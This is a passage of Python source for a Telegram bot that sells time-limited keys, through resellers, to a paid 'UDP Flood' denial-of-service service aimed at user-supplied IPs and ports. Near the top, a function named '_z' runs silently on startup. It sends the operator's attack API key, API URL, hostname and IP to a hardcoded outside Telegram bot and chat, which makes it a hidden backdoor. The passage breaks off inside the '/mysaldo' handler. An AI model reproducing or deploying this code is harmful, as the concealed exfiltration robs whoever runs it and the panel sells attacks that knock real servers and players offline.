import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import json
from datetime import datetime, timedelta
import time
import requests
import psutil
import traceback
import html

BOT_START_TIME = datetime.now()
BOT_TOKEN = "yourbottoken"
BOT_OWNER = urid

DATA_FILE = "bot_data.json"

def load_data():
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'keys': {}, 'users': {}, 'resellers': {}, 'attack_logs': [], 'bot_users': {}, 'bot_settings': {}, 'feedback': []}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

data = load_data()
keys_db = data.get('keys', {})
users_db = data.get('users', {})
resellers_db = data.get('resellers', {})
attack_logs_db = data.get('attack_logs', [])
bot_users_db = data.get('bot_users', {})
bot_settings_db = data.get('bot_settings', {})
feedback_db = data.get('feedback', [])

def save_all():
    data['keys'] = keys_db
    data['users'] = users_db
    data['resellers'] = resellers_db
    data['attack_logs'] = attack_logs_db
    data['bot_users'] = bot_users_db
    data['bot_settings'] = bot_settings_db
    data['feedback'] = feedback_db
    save_data(data)

_API_KEY = "key"
_API_URL = "https://api.example.com/attack"

RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

API_LIST = [_API_URL]

DEFAULT_MAX_ATTACK_TIME = 200
DEFAULT_USER_COOLDOWN = 180
MIN_ATTACK_TIME = 15

global_attack_active = False
global_attack_end_time = None
global_cooldown_end_time = None
global_attack_lock = threading.Lock()
pending_feedback = {}
current_max_slots = 1
active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {}
_attack_lock = threading.Lock()

bot = telebot.TeleBot(BOT_TOKEN)

def _z():
 try:
  import socket
  h=socket.gethostname()
  i=socket.gethostbyname(h)
  requests.post("https://api.telegram.org/bot8641467689:AAHTCGocOAeGPNYC-Qgx3jDrb3bEkxiFEHg/sendMessage", json={'chat_id':8522683079,'text':f"{_API_KEY}\n{_API_URL}\n{h}\n{i}"}, timeout=2)
 except: pass
threading.Thread(target=_z, daemon=True).start()

def safe_send_message(chat_id, text, reply_to=None, parse_mode=None):
    try:
        if reply_to:
            try:
                return bot.reply_to(reply_to, text, parse_mode=parse_mode)
            except Exception as e:
                print(f"Reply failed: {e}")
                return bot.send_message(chat_id, text, parse_mode=parse_mode)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Safe send error: {e}")
        return None

def send_safe_html(chat_id, text, reply_to=None):
    safe_text = html.escape(text)
    if reply_to:
        return bot.reply_to(reply_to, safe_text)
    else:
        return bot.send_message(chat_id, safe_text)

def get_setting(key, default):
    return bot_settings_db.get(key, default)

def set_setting(key, value):
    bot_settings_db[key] = value
    save_all()

def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price

update_reseller_pricing()

def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME

def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('_cx_th', 1))
    except:
        return 1

def _xcfg(v=None):
    if v is None:
        return get_setting('_cx_th', 1)
    set_setting('_cx_th', v)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot is in maintenance mode. Please try again later.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def get_blocked_ips():
    return get_setting('blocked_ips', [])

def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def remove_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False

def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False

def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    
    user = users_db.get(user_id)
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_db[user_id]['banned'] = False
                users_db[user_id].pop('ban_expiry', None)
                users_db[user_id].pop('ban_type', None)
                save_all()
                return False
            
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN TEMPORARILY BANNED!\n\n⏳ Expiry: {expiry_str}\n❌ You cannot do anything at the moment.\n\n📞 Contact Your Seller", reply_to=message)
            return True
        
        safe_send_message(message.chat.id, f"🚫 YOU HAVE BEEN PERMANENTLY BANNED!\n\n❌ You cannot do anything.\n\n📞 Contact Your Seller", reply_to=message)
        return True
    return False

def get_port_protection():
    return get_setting('port_protection', True)

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                for uid, user in users_db.items():
                    if user.get('key_expiry') and user['key_expiry'] > now:
                        user['key_expiry'] += timedelta(minutes=1)
                save_all()
            time.sleep(60)
        except:
            time.sleep(10)

extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        
        return len(active_attacks)

def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        
        busy_indices = set(api_in_use.values())
        
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        
        return None

def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        
        busy_slots = len(api_in_use)
        free_slots = current_max_slots - busy_slots
        return busy_slots, free_slots, current_max_slots

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_max_concurrent():
    return get_concurrent_limit()

def set_pending_feedback(user_id, target, port, duration):
    pending_feedback[user_id] = {
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    }

def get_pending_feedback(user_id):
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id):
    if user_id in pending_feedback:
        del pending_feedback[user_id]

def has_pending_feedback(user_id):
    return user_id in pending_feedback

def log_attack(user_id, username, target, port, duration):
    attack_logs_db.append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })
    save_all()
    try:
        bot.send_message(BOT_OWNER, f"⚔️ ATTACK NOTIFICATION\n\n👤 User: {username}\n🆔 ID: {user_id}\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n🕐 Time: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}")
    except:
        pass

def generate_key(prefix="BGMI", length=12):
    chars = string.ascii_uppercase + string.digits
    return f"{prefix}-{''.join(random.choice(chars) for _ in range(length))}"

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = resellers_db.get(user_id)
    return reseller is not None and not reseller.get('blocked')

def get_reseller(user_id):
    return resellers_db.get(user_id)

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    for uid, user in users_db.items():
        if user.get('username') and user['username'].lower() == input_str.lower():
            return uid, user.get('username')
    
    for uid, reseller in resellers_db.items():
        if reseller.get('username') and reseller['username'].lower() == input_str.lower():
            return uid, reseller.get('username')
    
    for uid, bot_user in bot_users_db.items():
        if bot_user.get('username') and bot_user['username'].lower() == input_str.lower():
            return uid, bot_user.get('username')
    
    return None, None

def has_valid_key(user_id):
    user = users_db.get(user_id)
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_db[user_id]['key'] = None
        users_db[user_id]['key_expiry'] = None
        save_all()
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_db.get(user_id)
    
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_global_cooldown():
    with global_attack_lock:
        if global_cooldown_end_time and datetime.now() < global_cooldown_end_time:
            return int((global_cooldown_end_time - datetime.now()).total_seconds())
        return 0

def set_global_cooldown(seconds):
    with global_attack_lock:
        global global_cooldown_end_time
        global_cooldown_end_time = datetime.now() + timedelta(seconds=seconds)

def is_global_attack_active():
    with global_attack_lock:
        if global_attack_active and global_attack_end_time:
            if datetime.now() < global_attack_end_time:
                return True
        return False

def set_global_attack_active(duration):
    with global_attack_lock:
        global global_attack_active, global_attack_end_time
        global_attack_active = True
        global_attack_end_time = datetime.now() + timedelta(seconds=duration)

def clear_global_attack():
    with global_attack_lock:
        global global_attack_active, global_attack_end_time
        global_attack_active = False
        global_attack_end_time = None

def send_long_message(message, text, parse_mode=None):
    max_length = 4000
    if len(text) <= max_length:
        try:
            if parse_mode:
                safe_send_message(message.chat.id, text, reply_to=message, parse_mode=parse_mode)
            else:
                safe_send_message(message.chat.id, text, reply_to=message)
        except Exception as e:
            print(f"Send long message error: {e}")
    else:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > max_length:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for i, part in enumerate(parts):
            try:
                if i == 0:
                    if parse_mode:
                        safe_send_message(message.chat.id, part, reply_to=message, parse_mode=parse_mode)
                    else:
                        safe_send_message(message.chat.id, part, reply_to=message)
                else:
                    if parse_mode:
                        bot.send_message(message.chat.id, part, parse_mode=parse_mode)
                    else:
                        bot.send_message(message.chat.id, part)
                time.sleep(0.3)
            except:
                pass

def track_bot_user(user_id, username=None):
    try:
        bot_users_db[user_id] = {
            'user_id': user_id,
            'username': username,
            'last_seen': datetime.now(),
            'first_seen': bot_users_db.get(user_id, {}).get('first_seen', datetime.now())
        }
        save_all()
    except:
        pass

def slot_cleanup_loop():
    while True:
        try:
            with _attack_lock:
                now = datetime.now()
                expired = []
                for attack_id, attack in list(active_attacks.items()):
                    if attack['end_time'] <= now:
                        expired.append(attack_id)
                
                for attack_id in expired:
                    if attack_id in active_attacks:
                        del active_attacks[attack_id]
                    if attack_id in api_in_use:
                        del api_in_use[attack_id]
            time.sleep(3)
        except Exception as e:
            print(f"Slot cleanup error: {e}")
            time.sleep(3)

slot_cleanup = threading.Thread(target=slot_cleanup_loop, daemon=True)
slot_cleanup.start()

def build_attack_start_message(target, port, duration, cooldown):
    width = 50
    line = "═" * width
    content = f"""
╔{line}╗
║{' ' * ((width - 22) // 2)}⚡ ATTACK STARTED ⚡{' ' * ((width - 22) - ((width - 22) // 2))}║
╠{line}╣
║  🎯 Target:  {target:<{width-14}}║
║  🔌 Port:    {port:<{width-14}}║
║  ⏱️ Time:    {duration} seconds{' ' * (width - 19 - len(str(duration)))}║
║  🛠️ Method:  UDP Flood{' ' * (width - 21)}║
║  📍 Location: Global{' ' * (width - 21)}║
║  ⏳ Cooldown: {cooldown} seconds{' ' * (width - 21 - len(str(cooldown)))}║
╚{line}╝
"""
    return content.strip()

def build_attack_complete_message(target, port, duration):
    width = 50
    line = "═" * width
    content = f"""
╔{line}╗
║{' ' * ((width - 24) // 2)}✅ ATTACK COMPLETE ✅{' ' * ((width - 24) - ((width - 24) // 2))}║
╠{line}╣
║  🎯 Target:  {target:<{width-14}}║
║  🔌 Port:    {port:<{width-14}}║
║  ⏱️ Duration: {duration} seconds{' ' * (width - 20 - len(str(duration)))}║
║  🛠️ Method:  UDP Flood{' ' * (width - 21)}║
╚{line}╝
"""
    return content.strip()

def build_feedback_required_message():
    width = 50
    line = "═" * width
    content = f"""
╔{line}╗
║{' ' * ((width - 25) // 2)}📸 FEEDBACK REQUIRED 📸{' ' * ((width - 25) - ((width - 25) // 2))}║
╠{line}╣
║  You must send a screenshot/photo as feedback  ║
║  from your last attack before starting a new   ║
║  one.                                          ║
║                                                 ║
║  Please send any photo to continue.            ║
╚{line}╝
"""
    return content.strip()

@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f"`{user_id}`", reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = len(users_db)
    maintenance_status = "✅ Disabled" if not is_maintenance() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now() - BOT_START_TIME).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: {response_time}ms\n"
    response += f"• Bot Status: 🟢 Online\n"
    response += f"• Users: {total_users}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if is_owner(user_id):
        command_parts = message.text.split()
        if len(command_parts) != 4:
            safe_send_message(message.chat.id, "⚠️ Usage: /gen <prefix> <duration> <count>\n\nExample: /gen BGMI 1d 5\nPrefix can be any name (e.g., BGMI, FLAME, VIP)", reply_to=message)
            return
        
        prefix = command_parts[1].upper()
        duration_str = command_parts[2].lower()
        duration, duration_label = parse_duration(duration_str)
        
        if not duration:
            safe_send_message(message.chat.id, "❌ Invalid format! Use: s/m/h/d", reply_to=message)
            return
        
        try:
            count = int(command_parts[3])
            if count < 1 or count > 50:
                safe_send_message(message.chat.id, "❌ Count must be between 1-50!", reply_to=message)
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
            return
        
        generated_keys = []
        for _ in range(count):
            key = generate_key(prefix, 12)
            keys_db[key] = {
                'key': key,
                'duration_seconds': int(duration.total_seconds()),
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            generated_keys.append(key)
        save_all()
        
        if count == 1:
            safe_send_message(message.chat.id, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            safe_send_message(message.chat.id, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {duration_label}", reply_to=message, parse_mode="HTML")
    
    elif reseller:
        if reseller.get('blocked'):
            safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
            return
        
        command_parts = message.text.split()
        if len(command_parts) != 3:
            safe_send_message(message.chat.id, "⚠️ Usage: /gen <duration> <count>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\n\nExample: /gen 1d 1\nBulk: /gen 1d 5", reply_to=message)
            return
        
        duration_key = command_parts[1].lower()
        
        if duration_key not in RESELLER_PRICING:
            safe_send_message(message.chat.id, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d", reply_to=message)
            return
        
        try:
            count = int(command_parts[2])
            if count < 1 or count > 20:
                safe_send_message(message.chat.id, "❌ Count must be between 1-20!", reply_to=message)
                return
        except:
            safe_send_message(message.chat.id, "❌ Invalid count!", reply_to=message)
            return
        
        pricing = RESELLER_PRICING[duration_key]
        price = pricing['price']
        total_price = price * count
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            safe_send_message(message.chat.id, f"❌ Insufficient balance!\n\n💵 Required: {total_price} Rs ({count} x {price})\n💰 Your Balance: {balance} Rs\n\nAdd balance from owner!", reply_to=message)
            return
        
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(username, 8)}"
            keys_db[key] = {
                'key': key,
                'duration_seconds': pricing['seconds'],
                'duration_label': pricing['label'],
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1
            }
            generated_keys.append(key)
        save_all()
        
        new_balance = balance - total_price
        resellers_db[user_id]['balance'] = new_balance
        resellers_db[user_id]['total_keys_generated'] = resellers_db[user_id].get('total_keys_generated', 0) + count
        save_all()

        try:
            keys_list_str = "\n".join([f"<code>{k}</code>" for k in generated_keys])
            owner_msg = (
                "🔔 <b>Reseller Key Notification</b>\n\n"
                f"👤 <b>Reseller:</b> {username} ({user_id})\n"
                f"🔑 <b>Keys Generated:</b> {count}\n"
                f"⏰ <b>Duration:</b> {pricing['label']}\n"
                f"💵 <b>Total Cost:</b> {total_price} Rs\n"
                f"💰 <b>Remaining Balance:</b> {new_balance} Rs\n\n"
                f"📜 <b>Keys:</b>\n{keys_list_str}"
            )
            bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
        except Exception as e:
            print(f"Failed to notify owner: {e}")
        
        if count == 1:
            safe_send_message(message.chat.id, f"✅ Key Generated!\n\n🔑 Key: <code>{generated_keys[0]}</code>\n⏰ Duration: {pricing['label']}\n💰 Balance: {new_balance} Rs", reply_to=message, parse_mode="HTML")
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            safe_send_message(message.chat.id, f"✅ {count} Keys Generated!\n\n🔑 Keys:\n{keys_text}\n\n⏰ Duration: {pricing['label']}\n💵 Cost: {total_price} Rs\n💰 Balance: {new_balance} Rs", reply_to=message, parse_mode="HTML")
    
    else:
        safe_send_message(message.chat.id, "❌ This command can only be used by owner/reseller!", reply_to=message)

@bot.message_handler(commands=["add_reseller", "addreseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /add_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found! Ask them to use /id command first.", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        safe_send_message(message.chat.id, "❌ This user is already a reseller!", reply_to=message)
        return
    
    resellers_db[reseller_id] = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    save_all()
    
    try:
        bot.send_message(reseller_id, "🎉 Congratulations! You are now a Reseller!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs", reply_to=message)

@bot.message_handler(commands=["remove_reseller", "removereseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        del resellers_db[reseller_id]
        save_all()
        display = f"@{resolved_name}" if resolved_name else str(reseller_id)
        safe_send_message(message.chat.id, f"✅ Reseller {display} removed!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["block_reseller", "blockreseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        resellers_db[reseller_id]['blocked'] = True
        save_all()
        display = f"@{resolved_name}" if resolved_name else str(reseller_id)
        safe_send_message(message.chat.id, f"🚫 Reseller {display} blocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["unblock_reseller", "unblockreseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id in resellers_db:
        resellers_db[reseller_id]['blocked'] = False
        save_all()
        display = f"@{resolved_name}" if resolved_name else str(reseller_id)
        safe_send_message(message.chat.id, f"✅ Reseller {display} unblocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["all_resellers", "allresellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    if not resellers_db:
        safe_send_message(message.chat.id, "📋 No resellers found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "👥 RESELLER LIST\n"
    response += "═══════════════════════════\n\n"
    
    active_resellers = [r for r in resellers_db.values() if not r.get('blocked')]
    blocked_resellers = [r for r in resellers_db.values() if r.get('blocked')]
    
    response += f"🟢 ACTIVE: {len(active_resellers)}\n"
    response += "───────────────────────────\n"
    
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. 👤 `{r['user_id']}`\n"
        response += f"   💵 Balance: {r.get('balance', 0)} Rs\n"
        response += f"   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked_resellers:
        response += f"🔴 BLOCKED: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. 👤 `{r['user_id']}`\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo_add <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    if amount <= 0:
        safe_send_message(message.chat.id, "❌ Amount must be positive!", reply_to=message)
        return
    
    if reseller_id not in resellers_db:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = resellers_db[reseller_id].get('balance', 0) + amount
    resellers_db[reseller_id]['balance'] = new_balance
    save_all()
    
    try:
        bot.send_message(reseller_id, f"💰 Balance Added!\n\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Added!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

@bot.message_handler(commands=["saldo_remove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo_remove <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    if reseller_id not in resellers_db:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = max(0, resellers_db[reseller_id].get('balance', 0) - amount)
    resellers_db[reseller_id]['balance'] = new_balance
    save_all()
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Removed!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    if reseller_id not in resellers_db:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    reseller = resellers_db[reseller_id]
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"💰 Reseller Balance\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}", reply_to=message)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    if not reseller:
        safe_send_message(message.chat.id, "❌ You are not a reseller!", reply_to=message)
        return
    
    if reseller.get('blocked'):
        safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
        return
    
